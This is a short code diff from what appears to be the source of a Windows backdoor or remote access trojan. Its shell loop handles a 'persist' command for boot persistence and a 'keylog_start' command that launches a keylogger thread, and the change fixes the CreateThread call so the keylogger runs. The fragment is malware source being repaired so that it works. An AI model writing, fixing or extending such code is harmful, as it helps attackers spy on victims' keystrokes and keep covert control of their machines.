@@ -103,7 +103,7 @@ void Shell(){
         } else if(strncmp("persist", buffer, 7) == 0){
             bootRun();
         } else if(strncmp("keylog_start", buffer, 12) == 0){
-            HANDLE thread = CreateThread(NULL, 0, logg());
+            HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
             continue;
         } else {
             FILE *fp;
